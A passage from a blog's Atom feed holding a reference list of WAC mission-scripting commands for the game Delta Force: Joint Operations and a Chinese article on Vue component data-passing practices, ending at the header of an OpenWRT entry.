(ssn)<br><br>// removeSSN (ssn)<br><br>// teleSSN (ssn, target)<br><br>// SSNwave (ssn, filename, distance)<br><br>// SSNradio (ssn, filename)<br><br>// SS2SSN (soundset, ssn)<br><br>// SSNanim (ssn, anim)<br><br>// SSNMin (ssn, distance)<br><br>// SSNMax (ssn, distance)<br><br>// SSNAtt (ssn, distance)<br><br>// SSNSpawn (ssn, number)<br><br>// SSNHP (ssn, number)<br><br>// SSNADDHP (ssn, number)<br><br>// ssn2ssn (ssn, ssn)<br><br>// ssnrelease (ssn)<br><br>// ssnface (ssn, face)<br><br>// ssnturn (ssn, heading)<br><br>// ssnguard (ssn, number)<br><br>// ssnname (ssn, texttoken)<br><br>// ssnpspd (ssn, number)<br><br>// ssncspd (ssn, number)<br><br>// ssnuse (ssn)<br><br>// set (variable, value)<br><br>// add (variable, value)<br><br>// sub (variable, value)<br><br>// inc (variable)<br><br>// dec (variable)<br><br>// store (variable)<br><br>// load (value)<br><br>// TOD (hour)<br><br>// targetfx (target)<br><br>// ammo2tgt (ammo, target)<br><br>// fx2tgt (fx, target)<br><br>// ammoarea (ammo, area)<br><br>// sound2tgt (soundset, target)<br><br>// flash ()<br><br>// farflash ()<br><br>// quake (number)<br><br>// win (number)<br><br>// lose (number)<br><br>// music (number)<br><br>// skyspeed (number)<br><br>// skyheight (number)<br><br>// fogtype (number)<br><br>// fogdist (distance)<br><br>// movefog (distance, seconds)<br><br>// rain (number, seconds)<br><br>// snow (number, seconds)<br><br>// overcast (number, seconds)<br><br>// Help ()<br><br>// text# (text, number)<br><br>// consol (text)<br><br>// consol# (text, number)<br><br><br><br>// WAC Debug Commands (This also contains old stuff)<br><br><br><br>// sound (soundset, distance, heading)<br><br>// forceanim (anim)<br><br>// tele (ssn)<br><br>// fall ()<br><br>// fov (number)<br><br>// squadevent (number)<br><br>// random (number)<br><br>// outside ()<br><br>// location (number)<br><br>// area (area)<br><br>// area3D (area)<br><br>// waveready ()<br><br>// weaponfired (number)<br><br>// event (number)<br><br>// meride (ssn)<br><br>// meattached (ssn)<br><br>// medrive (ssn)<br><br>// meongun (ssn)<br><br>// ammorain (ammo)<br><br>// fxrain (fx)<br><br>// lightning (red, green, blue)<br><br>// face (face)<br><br>// anim (anim)<br><br>// sunfade (number, seconds)<br><br>// gain (red, green, blue)<br><br>// squadclear ()<br><br>// blockfire (number, number)<br><br>// colorfade (number)<br><br>// sun (red, green, blue)<br><br>// sky (red, green, blue)<br><br>// ground (red, green, blue)<br><br>// floor (red, green, blue)<br><br>// ceiling (red, green, blue)<br><br>// cloud (red, green, blue)<br><br>// fogcolor (red, green, blue)<br><br>// fog (red, green, blue)<br><br>// skyfogcolor (red, green, blue)<br><br>// skyfog (red, green, blue)<br><br>// crash (red, green, blue, green)<br><br>// eq (number, number)<br><br>// ne (number, number)<br><br>// lt (number, number)<br><br>// gt (number, number)<br><br>// le (number, number)<br><br>// ge (number, number)<br><br>// true (number)<br><br>// false (number) <br><br><br><br>///////////////////WAC HELP 3///////////////////<br><br>&nbsp;;WAC Text in Color<br><br>;<br><br>;This WAC code was supplied by Bubbachuk~{PG}~<br><br>;<br><br>;Here is a short list of the color codes you can use to change<br><br>;the color of the WAC scripts: The script has to be enclosed<br><br>;between right and left arrows, i.e. &lt;#####&gt; and inserted<br><br>;before the line of text in the consol or text displays, i.e.<br><br>;<br><br>;if never() then<br><br>;consol(“&lt;#####&gt;Insert color code before actual text. Characters”)<br><br>;text(“&lt;#####&gt;in the code count in the character count allowed”)<br><br>;text(“&lt;#####&gt;for each line.”)<br><br>;endif<br><br>;<br><br>;cfff500 or co01 = Yellow<br><br>;co30 = Light Yellow<br><br>;co100 = Dark Yellow<br><br>;cff5000 = Orange<br><br>;cf50000 = Red<br><br>;cf500000 or c300004 = Dark Red<br><br>;c5000 = Dark Green<br><br>;cf500 = Green<br><br>;co99 = Light Blue<br><br>;cff50 = Turquoise<br><br>;cfffff5 = White (Don’t see any reason to use this one)<br><br>;cr953o3 = Gray<br><br>;cffff50 = Tan<br><br>;cf or ca = Black<br><br>;cf50 or cab = Dark Blue<br><br>;cff5 or ca0 = Blue<br><br>;ca0014 = Purple<br><br>;b = Bold Text<br><br>;i = Text with Italics<br><br>;u = will Underline Text <br><br><br><br>///////////////////WAC HELP 4///////////////////<br><br>;Previous()<br><br>;chain(SECONDS)<br><br>;then<br><br>;Elapse(SECONDS)<br><br>;Past(SECONDS)<br><br>;Before(SECONDS)<br><br>;OnTick(SECONDS)<br><br>;night()<br><br>;eq(VAR,NUMBER)<br><br>;ge(VAR,NUMBER)<br><br>;le(VAR,NUMBER)<br><br>;gt(VAR,NUMBER)<br><br>;lt(VAR,NUMBER)<br><br>;eq(VAR,VAR)<br><br>;ge(VAR,VAR)<br><br>;le(VAR,VAR)<br><br>;gt(VAR,VAR)<br><br>;lt(VAR,VAR)<br><br>;ne(VAR,NUMBER)<br><br>;ne(VAR,VAR)<br><br>;true(VAR)<br><br>;false(VAR)<br><br>;groupdead(GROUP)<br><br>;groupalive(GROUP)<br><br>;ssndead(SSN)<br><br>;ssnwounded(SSN)<br><br>;ssnride(SSN)<br><br>;ssnonssn(SSN,SSN)<br><br>;ssnnearssn(SSN,SSN,DISTANCE)<br><br>;ssnlosssn(SSN,SSN,DISTANCE)<br><br>;ssnseesssn(SSN,SSN,DISTANCE)<br><br>;ssnarea3d(SSN,AREA)<br><br>;ssnalive(SSN)<br><br>;NOT ssnalive(SSN)<br><br>;ssnnearssn(SSN,TEXT,DISTANCE)<br><br>;ssnseesssn(SSN,TEXT,DISTANCE)<br><br>;ssncritical(SSN)<br><br>;random(NUMBER)<br><br>;waveready()<br><br>;weaponfired(NUMBER)<br><br>;Player (coop/multiplayer mode) TEXT = HUMANS<br><br>;true(TEXT)<br><br>;false(TEXT)<br><br>;ssnride(SSN)<br><br>;Player (single player mode) TEXT = 10000<br><br>;meride(SSN)<br><br>;meattached(SSN)<br><br>;medrive(SSN)<br><br>;meongun(SSN)<br><br>;ssndead(TEX)<br><br>;ssnwounded(TEXT)<br><br>;ssnonssn(TEXT,SSN)<br><br>;ssnnearssn(TEXT,SSN,DISTANCE)<br><br>;ssnlosssn(TEXT,SSN,DISTANCE)<br><br>;outside()<br><br>;GtoWP(GROUP,WAYPOINTLIST)<br><br>;Gkill(GROUP)<br><br>;Gremove(GROUP)<br><br>;GroupMin(GROUP,DISTANCE)<br><br>;GroupMax(GROUP,DISTANCE)<br><br>;GroupAtt(GROUP,DISTANCE)<br><br>;GroupSpawn(GROUP,NUMBER)<br><br>;GroupHP(GROUP,NUMBER)<br><br>;Gsetaccuracy(GROUP,NUMBER,NUMBER)<br><br>;teleport(GROUP,TARGET)<br><br>;SSNtoWP(SSN,WAYPOINTLIST)<br><br>;KillSSN(SSN)<br><br>;removeSSN(SSN)<br><br>;teleSSN(SSN,TARGET)<br><br>;ssnWave(SSN,TEXT,DISTANCE)<br><br>;ssncspd(SSN,NUMBER)<br><br>;ssnpspd(SSN,NUMBER)<br><br>;SSNanim(SSN,ANIM)<br><br>;SSNMin(SSN,DISTANCE)<br><br>;SSNMax(SSN,DISTANCE)<br><br>;SSNAtt(SSN,DISTANCE)<br><br>;SSNSpawn(SSN,NUMBER)<br><br>;SSNHP(SSN,NUMBER)<br><br>;ssnUse(SSN)<br><br>;ssnRelease(SSN)<br><br>;SSN2SSN(SSN,SSN)<br><br>;ssnface(SSN,FACE)<br><br>;ssnTurn(SSN,HEADING)<br><br>;SSNtoWP(SSN,NUMBER)- Waypoint 123,124,125,126,127<br><br>;hideSSN(SSN)<br><br>;unhideSSN(SSN)<br><br>;enableSSN(SSN)<br><br>;disableSSN(SSN)<br><br>;fov(SSN,NUMBER)<br><br>;ssnguard(SSN,NUMBER)<br><br>;ssnblind(SSN,NUMBER)<br><br>;ssnclimb(SSN,NUMBER)<br><br>;setaccuracy(SSN,NUMBER,NUMBER)<br><br>;holdSSN(SSN)<br><br>;unholdSSN(SSN)<br><br>;SSNLeadSSN2SSN(SSN,SSN,SSN)<br><br>;ssnaddhp(SSN,NUMBER)<br><br>;set(VAR,NUMBER)<br><br>;add(VAR,NUMBER)<br><br>;sub(VAR,NUMBER)<br><br>;inc(VAR)<br><br>;dec(VAR)<br><br>;tod(TIME)<br><br>;ammo2tgt(AMMO,TARGET)<br><br>;fx2tgt(FX,TARGET)<br><br>;ammorain(AMMO)<br><br>;ammoarea(AMMO,AREA)<br><br>;fxrain(FX)&lt;/WAC&gt;<br><br>;sound2tgt(SOUNDSET,TARGET)<br><br>;flash()<br><br>;farflash()<br><br>;quake(SECONDS)<br><br>;fogdist(DISTANCE)<br><br>;win(NUMBER)<br><br>;rain(NUMBER,NUMBER)<br><br>;overcast(NUMBER,NUMBER)<br><br>;Wave(TEXT)<br><br>;fogtype(NUMBER)- Fog Type (0,1,2,3)<br><br>;gain(NUMBER,NUMBER,NUMBER)<br><br>;skyspeed(NUMBER)<br><br>;snow(NUMBER,NUMBER)<br><br>;movefog(DISTANCE,NUMBER)<br><br>;wind(NUMBER,SECONDS<br><br>;floor(NUMBER,NUMBER,NUMBER)<br><br>;ceiling(NUMBER,NUMBER,NUMBER)<br><br>;fog(NUMBER,NUMBER,NUMBER)<br><br>;accuracyspread = (NUMBER)<br><br>;breathtime = (NUMBER)<br><br>;fallmps = (NUMBER)<br><br>;text#(TEXT,VAR)<br><br>;consol(TEXT)<br><br>;consol#(TEXT,VAR)<br><br>;text(TEXT)<br><br>;PLOOP<br><br>;GLOOP<br><br>;<br><br>;<br><br>;1. Previous() - Previous conditional was true.<br><br>;Example:<br><br>;code<br><br>;if never enter<br><br>;consol(“Sending an enemy to stand on a platform”)<br><br>;ssn2ssn(xxxx,xxxxx)<br><br>;endif<br><br>;if previous() and never enter<br><br>;consol(“Once enemy stands on that platform, Will send his buddy to a waypoint!”)<br><br>;SSNtoWP(XXXX,X)<br><br>;endif<br><br>;<br><br>;2. chain() - Previous conditional was true and One seconds have elapsed.<br><br>;Example:<br><br>;code:<br><br>;if past(30) and never enter<br><br>;consol(“Will rain in thirty seconds at 60%!”)<br><br>;rain(60)<br><br>;endif<br><br>;if chain(30) enter<br><br>;consol(“Thirty seconds later dark clouds will form overhead at 90%!”)<br><br>;overcast(90)<br><br>;endif<br><br><br><br>;3. then - Means end of conditional. You can also use enter instead of then. if you choose to use enter replacing then use it throughout the entire wac script your working on. Don’t mismatch then and enter either one or the other.<br><br>;Example:<br><br>;if never() enter<br><br>;consol(“Enemy will follow the closest player!”)<br><br>;ssn2ssn(xxxx,player)<br><br>;endif<br><br>;<br><br>;4. Elapse() - One seconds have elapsed since conditional was last true. Fires continually<br><br>;Example<br><br>;code:<br><br>;if elapse(40) enter<br><br>;consol(“Every forty seconds their will be an explosion!”)<br><br>;killSSN(XXXXX)<br><br>;endif<br><br>;<br><br>;<br><br>;5. past() - At least one seconds since the mission started before this firers.<br><br>;Example<br><br>;CODE:<br><br>;if past(50) and never enter<br><br>;consol(“Your seeing this message because fifty seconds has pass!”)<br><br>;endif<br><br>;<br><br>;<br><br>;6. Before - How many seconds since mission started<br><br>;Example<br><br>;CODE:<br><br>;if Before(3) and OnTick(3) and never enter<br><br>;consol(“Setting up v1 to go to zero reguardless of humans”)<br><br>;set(v1,0)<br><br>;endif<br><br>;if chain(3) enter<br><br>;consol(“Now I Know v1 equals zero because their is humans!”)<br><br>;v1 = = 0<br><br>;endif<br><br>;<br><br>;7. OnTick exactly one seconds since the mission started<br><br>;Example:<br><br>;CODE<br><br>;if OnTick(180) enter<br><br>;consol#(“TIME NOW”,CurTOD)<br><br>;consol#(“Time Update Will Be Every Three minutes”)<br><br>;endif<br><br>;<br><br>;8. night() Night falls between these hours (19:00 - 6:00). Even know I knew this one did not work at the beginning, still wanted to test it anyway. Does not work. You can set-up the time rate and environment file using nile map editor. But<br>the wac script for night does not work. You can use NLH under terrain to change the environment files also. The lowest rate for time change is one hour = 24hour period.<br><br>;<br><br>;9. var = = Num or eq(VAR,NUMBER) First before I give the code below let me explain what is I’m doing here. I’ am setting up a variable this case it’s going to be v1. Next I will set up the number of items I want to keep track of, this case<br>it’s three. Using the VAR to subtract the number of deaths.<br><br>;EXAMPLE:<br><br>;CODE<br><br>;if never enter<br><br>;set(v1,3)<br><br>;endif<br><br>;if eq(v1,0) and never enter<br><br>;consol(“Each time an item is destroyed subtract intil it reaches zero!)<br><br>;endif<br><br>;if ssndead(xxxxx) and never enter<br><br>;dec(v1)<br><br>;endif<br><br>;if ssndead(xxxxx) and never enter<br><br>;dec(v1)<br><br>;endif<br><br>;if ssndead(xxxxx) and never enter<br><br>;;dec(v1)<br><br>;;endif</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;br&gt;&lt;br&gt;///////////////////WAC HELP 1（MED）///////////////////&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;;wac file - nestable IF/THEN/ELSE/ENDIF boolean logic&lt;br&gt;&lt;br&gt;;&lt;br&gt;&lt;br&gt;;WAC post directory w:\vp\program\wac - commands listed in GAME.WAC&lt;br&gt;&lt;br&gt;;WAC debug screen under shift-F12, numlock arrows to select and scroll&lt;br&gt;&lt;br&gt;;&lt;br&gt;&lt;br&gt;;GLOBAL WAC is GAME.WAC (executed first)&lt;br&gt;&lt;br&gt;;&lt;br&gt;&lt;br&gt;;MISSION WAC is misname.WAC (executed second)&lt;br&gt;&lt;br&gt;;&lt;br&gt;&lt;br&gt;;Left to Right order of operations&lt;br&gt;&lt;br&gt;;&lt;br&gt;&lt;br&gt;
    
    </summary>
    
      <category term="游戏" scheme="https://hexo.bangz.me/categories/%E6%B8%B8%E6%88%8F/"/>
    
    
      <category term="三角洲特种部队" scheme="https://hexo.bangz.me/tags/%E4%B8%89%E8%A7%92%E6%B4%B2%E7%89%B9%E7%A7%8D%E9%83%A8%E9%98%9F/"/>
    
      <category term="联合行动" scheme="https://hexo.bangz.me/tags/%E8%81%94%E5%90%88%E8%A1%8C%E5%8A%A8/"/>
    
      <category term="地图制作" scheme="https://hexo.bangz.me/tags/%E5%9C%B0%E5%9B%BE%E5%88%B6%E4%BD%9C/"/>
    
  </entry>
  
  <entry>
    <title>Vue 组件间传参最佳实践</title>
    <link href="https://hexo.bangz.me/archives/vue-best-ways-to-pass-props-data-in-different-component-relations.html"/>
    <id>https://hexo.bangz.me/archives/vue-best-ways-to-pass-props-data-in-different-component-relations.html</id>
    <published>2019-06-20T06:00:08.000Z</published>
    <updated>2019-12-31T06:20:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>要分享的问题：</p><ol><li>Vue 都提供了哪些传参方式，每种传参方式都有什么优劣？</li><li>在什么场景下分别适合用什么方式进行传参？</li><li>怎么去总结这些选用传参方式时背后的根据？</li></ol><h2 id="1-总结一下-vue-中所有的组件间的传参方式"><a href="#1-总结一下-vue-中所有的组件间的传参方式" class="headerlink" title="1. 总结一下 vue 中所有的组件间的传参方式"></a>1. 总结一下 vue 中所有的组件间的传参方式</h2><h4 id="1-1-通过-props-或者-attrs-传递数据"><a href="#1-1-通过-props-或者-attrs-传递数据" class="headerlink" title="1.1 通过 props 或者 $attrs 传递数据"></a>1.1 通过 props 或者 $attrs 传递数据</h4><ul><li>原理：通过 v-bind 指令向子组件传递数据，子组件可通过 props 或者 inheritAttrs 接收数据</li><li>优点：简单直接，子组件在获取父组件的数据时就好像在获取自己的数据一样</li><li>缺点：由于单向数据流的设计思路，当子组件希望改变 props 中的数据时，需要经过额外的操作才能改变，在组件树层级较深的时候，跨层级数据传递和管理都不方便，<a id="more"></a></li></ul><h4 id="1-2-通过-emit-events-在父子组件间传递数据"><a href="#1-2-通过-emit-events-在父子组件间传递数据" class="headerlink" title="1.2 通过 emit events 在父子组件间传递数据"></a>1.2 通过 emit events 在父子组件间传递数据</h4><ul><li>原理：先通过 v-on 指令对子组件注册 listener，或者通过 $on 注册 listener，再通过 $emit 将数据带上传给 listeners</li><li>优点：写法简单易读，模式成熟，并与 Vue 组件的生命周期绑定，没有使用原生的 EventListener，所以会自动销毁。而且 events 的作用域受限，不会像 $boardcast 那样导致事件泛滥</li><li>缺点：由于 events 的作用域受限，在非父子组件间使用 events 做数据通信时会比较尴尬</li></ul><h4 id="1-3-通过-vue-router-的-query-或者-params-在不同路由间传递数据"><a href="#1-3-通过-vue-router-的-query-或者-params-在不同路由间传递数据" class="headerlink" title="1.3 通过 vue-router 的 query 或者 params 在不同路由间传递数据"></a>1.3 通过 vue-router 的 query 或者 params 在不同路由间传递数据</h4><ul><li>原理：其实就是不同页面间通过 url 传参，原来的 search 字符串被解析成 query 对象，REST url 会被解析成 params 对象</li><li>优点：可以直接在跳转的时候在同一个方法里面把数据带过去，操作简单，支持 REST url，表达性强</li><li>缺点：当传递的参数是一个对象时，url 会变得很难看，而且 url 有长度限制，传递的数据量有限，不能放需要持久化的数据，因为跳转到其他路由时，参数数据可能会被丢失，比如 openid，platform 之类的参数</li></ul><h4 id="1-4-通过-vuex-在不同组件间共享数据"><a href="#1-4-通过-vuex-在不同组件间共享数据" class="headerlink" title="1.4 通过 vuex 在不同组件间共享数据"></a>1.4 通过 vuex 在不同组件间共享数据</h4><ul><li>原理：引入一个专门用于状态管理的库，用于管理需要全局共享的状态数据</li><li>优点：有一个专门的地方存放状态，不受 Vue 生命周期的限制，而且状态数据的存取方式比较科学和严格</li><li>缺点：库比较重，当数据量较少时可以有其他的替代方式（比如可以寄存在 $root 下），对使用者有一定的理解门槛</li></ul><h4 id="1-5-通过-EventBus-在不同组件间传递数据"><a href="#1-5-通过-EventBus-在不同组件间传递数据" class="headerlink" title="1.5 通过 EventBus 在不同组件间传递数据"></a>1.5 通过 EventBus 在不同组件间传递数据</h4><ul><li>原理：仿照事件总线的思路，单独开一个 Vue 实例，专门用于不同组件间的事件通信</li><li>优点：轻量，不需要额外的第三方依赖，是 Vue 官方文档本身提到的通信方式，理解成本低，非亲属关系的组件之间也能直接通信</li><li>缺点：当事件量越来越大时，不易管理订阅关系，由于脱离了源组件的生命周期，源组件在销毁时漏掉 $off 操作有可能导致内存泄漏。在使用时要将 EventBus 写成单例模式，否则有多个 bus 时容易使代码混乱</li></ul><h4 id="1-6-通过-provide-和-inject-方法传递数据"><a href="#1-6-通过-provide-和-inject-方法传递数据" class="headerlink" title="1.6 通过 provide 和 inject 方法传递数据"></a>1.6 通过 provide 和 inject 方法传递数据</h4><ul><li>原理：在上游组件暴露出数据对象或方法，下游组件通过遍历 $parent 链找到最近的上游 provide，并注入给自身实例使用</li><li>优点：可以在祖孙组件间传递数据，由 Vue 本身提供，不需要第三方库依赖，适用于基础组件</li><li>缺点：本身属于一种 hack 类型的代码，当存在较多个上游 provide 或多个下游 inject 时，代码会变得难以理解</li></ul><h2 id="2-在不同组件关系间对于传参方式的选用"><a href="#2-在不同组件关系间对于传参方式的选用" class="headerlink" title="2. 在不同组件关系间对于传参方式的选用"></a>2. 在不同组件关系间对于传参方式的选用</h2><h4 id="2-1-父子组件间的数据传递"><a href="#2-1-父子组件间的数据传递" class="headerlink" title="2.1 父子组件间的数据传递"></a>2.1 父子组件间的数据传递</h4><p>在 Vue 中，处于父子关系的组件，要从父组件获取子组件的数据，有以下几种方式</p><ol><li>通过绑定 props 将父组件的数据关联到子组件，并修饰 .sync 或者用 v-model 同步来自子组件的数据变化 <code>推荐</code></li><li>绑定 listener 事件监听器，当子组件状态或者数据发生变化时，触发事件并将数据传递到父组件 <code>推荐</code></li><li>给子组件配置 ref 属性，当父组件需要时直接通过 $refs 去访问子组件内的 data 数据 <code>不推荐</code></li><li>父组件通过 $children 获取子组件实例，再访问子组件的数据 <code>不推荐</code></li><li>子组件将数据放到 Vuex，父组件从 Vuex 中获取子组件的数据 <code>不推荐</code></li><li>父组件通过 EventBus 或者 $root 去注册事件监听，子组件去触发事件上传数据 <code>不推荐</code></li></ol><p>而要从子组件获取父组件的数据，也有以下几种方式</p><ol><li>获取 props 或者 $attrs 传下来的数据 <code>推荐</code></li><li>通过 vuex 去接受父组件共享的数据 <code>不推荐</code></li><li>通过 EventBus 去注册监听父组件的事件 <code>不推荐</code></li><li>通过 provide 和 inject 获取父组件的数据 <code>不推荐</code></li><li>通过在 $parent.$on 监听父组件的事件，接受其传过来的数据 <code>不推荐</code></li><li>通过 $parent 直接找到父组件的 data 去获取数据 <code>不推荐</code></li></ol><h4 id="2-2-兄弟组件间的数据传递"><a href="#2-2-兄弟组件间的数据传递" class="headerlink" title="2.2 兄弟组件间的数据传递"></a>2.2 兄弟组件间的数据传递</h4><p>在 Vue 中，处于兄弟关系的组件，要相互通信获取数据，有以下几种方式</p><ol><li>通过 EventBus 或者 $root 去注册事件，由兄弟组件去监听事件传递过来的数据变化 <code>推荐</code></li><li>在 Vuex 存放状态，并在两个组件中都监听状态变化 <code>推荐</code></li><li>在父组件上绑定状态，并通过 v-model 或者 .sync 绑定到两个兄弟组件中去，以同步数据变化 <code>推荐</code></li><li>通过 $parent 再去找 $children 中兄弟组件的数据 <code>不推荐</code></li></ol><h4 id="2-3-祖孙组件间的数据传递"><a href="#2-3-祖孙组件间的数据传递" class="headerlink" title="2.3 祖孙组件间的数据传递"></a>2.3 祖孙组件间的数据传递</h4><p>在 Vue 中，处于祖孙关系的组件，而且孙组件被直接写在了祖先组件的 template 内，要从祖先组件获取孙组件的数据，有以下几种方式</p><ol><li>可以在模板上给孙组件绑定 ref 并通过 $refs 调用孙组件的方法获取数据 <code>推荐</code></li><li>可以在模板上给孙组件绑定 listener 获取孙组件传过来的数据 <code>推荐</code></li><li>可以在模板上给孙组件绑定 v-model 或者 .sync 同步孙组件的数据 <code>推荐</code></li><li>将数据状态存放在 Vuex 内，再由祖先组件和孙组件之间共享 <code>不推荐</code></li><li>由孙组件去触发 EventBus 事件，再由祖先组件去监听来自孙组件的数据变化 <code>不推荐</code></li><li>祖先组件提供对象类型的 provide 属性，在孙组件 inject 后，修改对象中的属性值，数据会同步回给祖先组件 <code>不推荐</code></li><li>通过 $children.$children 去直接访问获取孙组件中的数据 <code>不推荐</code></li></ol><p>如果孙组件不在祖先组件的 template 内，要从祖先组件获取孙组件的数据，有以下几种方式</p><ol><li>先在子组件上绑定 v-model 或者 .sync，接着再在子组件的模板上通过 v-model 或者 .sync 绑定孙组件，以同步孙组件的数据 <code>推荐</code></li><li>现在孙组件上绑定 listener，再给子组件绑定 listener，数据由事件层层上传给祖先组件 <code>推荐</code></li><li>由孙组件去注册 EventBus 事件，再由祖先组件去监听来自孙组件的数据变化 <code>推荐</code></li><li>将数据状态存放在 Vuex 内，再由祖先组件和孙组件之间共享 <code>不推荐</code></li><li>祖先组件提供对象类型的 provide 属性，在孙组件 inject 后，修改对象中的属性值，数据会同步回给祖先组件 <code>不推荐</code></li><li>通过 $children.$children 去直接访问获取孙组件中的数据 <code>不推荐</code></li></ol><p>如果孙组件在祖先组件的 template 内，要从孙组件获取祖先组件的数据，有以下几种方式</p><ol><li>直接在祖先组件的 template 中通过 v-bind 将数据传递到孙组件中，孙组件通过 props 或者 $attrs 进行接收 <code>推荐</code></li><li>孙组件在 EventBus 中注册事件，监听来自祖先组件触发的事件数据 <code>不推荐</code></li><li>通过 $parent.$parent 向上找到祖先组件，然后访问祖先组件的数据 <code>不推荐</code></li><li>祖先组件将数据挂到 Vuex 中，再由孙组件从 Vuex 中去获取数据 <code>不推荐</code></li><li>在祖先组件提供 provide 将数据暴露出来，再由孙组件 inject 获取数据 <code>不推荐</code></li></ol><p>如果孙组件不在祖先组件的 template 内，要从孙组件获取祖先组件的数据，有以下几种方式</p><ol><li>先在子组件上 v-bind 绑定数据，接着再在子组件上通过 v-bind 绑定孙组件，数据层层向下传递 <code>推荐</code></li><li>孙组件在 EventBus 中注册事件，监听来自祖先组件触发的事件数据 <code>推荐</code></li><li>祖先组件将数据挂到 Vuex 中，再由孙组件从 Vuex 中去获取数据 <code>推荐</code></li><li>通过 $parent.$parent 向上找到祖先组件，然后访问祖先组件的数据 <code>不推荐</code></li><li>在祖先组件提供 provide 将数据暴露出来，再由孙组件 inject 获取数据 <code>不推荐</code></li></ol><h4 id="2-4-在不同路由组件之间的数据传递"><a href="#2-4-在不同路由组件之间的数据传递" class="headerlink" title="2.4 在不同路由组件之间的数据传递"></a>2.4 在不同路由组件之间的数据传递</h4><p>在 Vue 中，若数据需要从前一个路由组件传递到后一个路由组件，有以下的数据传递方式</p><ol><li>直接通过 vue-router 的 query 和 params 在路由跳转时传递数据 <code>推荐</code></li><li>前一个路由组件将数据存放在 Vuex 中，在后一个路由组件中取出来 <code>推荐</code></li><li>将数据临时挂在 $root 实例下，待路由跳转完成后取出并移除 <code>不推荐</code></li></ol><p>若要在后一个路由组件点击返回按钮后，传递数据到前一个路由组件，有以下两种方式</p><ol><li>返回前将数据状态存放在 Vuex 内，然后回到前一个路由组件后从中取出来 <code>推荐</code></li><li>将数据临时挂在 $root 实例下，待路由跳转完成后取出并移除 <code>推荐</code></li></ol><h4 id="2-5-无直接关系组件之间的数据传递"><a href="#2-5-无直接关系组件之间的数据传递" class="headerlink" title="2.5 无直接关系组件之间的数据传递"></a>2.5 无直接关系组件之间的数据传递</h4><p>在 Vue 中，两个组件之间若没有简单直接的关系，要相互通信获取数据，有以下几种方式</p><ol><li>通过 EventBus 或者 $root 去注册事件，由兄弟组件去监听事件传递过来的数据变化 <code>推荐</code></li><li>在 Vuex 存放状态，并在两个组件中都监听状态变化 <code>推荐</code></li><li>将数据挂载 Vue.prototype 下，由 vue 去共享数据，类似于 $msgbox 这种共享数据 <code>一般不推荐，复用性强的时候推荐</code></li></ol><h2 id="3-实践中选择传参方式的根据"><a href="#3-实践中选择传参方式的根据" class="headerlink" title="3. 实践中选择传参方式的根据"></a>3. 实践中选择传参方式的根据</h2><ol><li>在大部分情况下，为了数据流向的清晰，都应该使用 props 将数据一层一层向下传递</li><li>在 v-bind 绑定具体属性的时候，应尽可能避免直接绑定整个对象，因为绑定对象有可能会破坏 watch 的观察效果</li><li>Vuex 应该尽可能放入可复用的状态，Vuex 模块在使用完后应清理数据</li><li>EventBus 在执行 $on 注册监听事件后，一定要记得使用 $off 注销事件，否则会内存泄漏</li><li>定义 props 时应尽可能配上默认值，避免一些不必要的渲染错误</li><li>在使用 vue-router 跳转路由的时候，应该尽可能减少参数的体积，不到万不得已不传整个对象，如果非要传整个对象，应该寄存到 $root， Vuex 或者其他地方去，因为 url 有长度限制，在跳转时参数过长会丢失数据，被寄存的数据记得应该在使用完成后进行销毁，避免内存泄漏</li><li>在业务组件中应尽可能避免使用 provide / inject 这种代码，因为 provide / inject 的数据流向不清晰，而且当父组件和祖先组件都存在同名的 provide 时，inject 的数据容易有歧义</li><li>使用 ref 时应该尽可能避免直接访问子孙组件的 data 数据，要修改子孙组件的数据时应该去访问子孙组件的 methods 中的方法，因为直接通过 $refs.xxx.data 去修改数据会导致组件数据混乱，不符合开闭原则</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;要分享的问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Vue 都提供了哪些传参方式，每种传参方式都有什么优劣？&lt;/li&gt;
&lt;li&gt;在什么场景下分别适合用什么方式进行传参？&lt;/li&gt;
&lt;li&gt;怎么去总结这些选用传参方式时背后的根据？&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;1-总结一下-vue-中所有的组件间的传参方式&quot;&gt;&lt;a href=&quot;#1-总结一下-vue-中所有的组件间的传参方式&quot; class=&quot;headerlink&quot; title=&quot;1. 总结一下 vue 中所有的组件间的传参方式&quot;&gt;&lt;/a&gt;1. 总结一下 vue 中所有的组件间的传参方式&lt;/h2&gt;&lt;h4 id=&quot;1-1-通过-props-或者-attrs-传递数据&quot;&gt;&lt;a href=&quot;#1-1-通过-props-或者-attrs-传递数据&quot; class=&quot;headerlink&quot; title=&quot;1.1 通过 props 或者 $attrs 传递数据&quot;&gt;&lt;/a&gt;1.1 通过 props 或者 $attrs 传递数据&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;原理：通过 v-bind 指令向子组件传递数据，子组件可通过 props 或者 inheritAttrs 接收数据&lt;/li&gt;
&lt;li&gt;优点：简单直接，子组件在获取父组件的数据时就好像在获取自己的数据一样&lt;/li&gt;
&lt;li&gt;缺点：由于单向数据流的设计思路，当子组件希望改变 props 中的数据时，需要经过额外的操作才能改变，在组件树层级较深的时候，跨层级数据传递和管理都不方便，
    
    </summary>
    
      <category term="技术研究" scheme="https://hexo.bangz.me/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="HTML5" scheme="https://hexo.bangz.me/tags/HTML5/"/>
    
      <category term="javascript" scheme="https://hexo.bangz.me/tags/javascript/"/>
    
      <category term="前端" scheme="https://hexo.bangz.me/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="ECMAScript" scheme="https://hexo.bangz.me/tags/ECMAScript/"/>
    
      <category term="Vue" scheme="https://hexo.bangz.me/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>在网件 WNDR4300v1 上编译 OpenWRT 并实现多线多拨</title>
    <link href="https://hexo.bangz.me/archives/openwrt-compile-and-mwan3-config-in-netgear-wndr4300.html"/>
    <id>https://hexo.bangz.me/archives/openwrt-compile-and-mwan3-config-in-netgear-wndr4300.html</id>
    <published>2018-10-20T04:18:28.000Z</published>
    <updated>2018-10-22T01:45:43.000Z</updated>
    
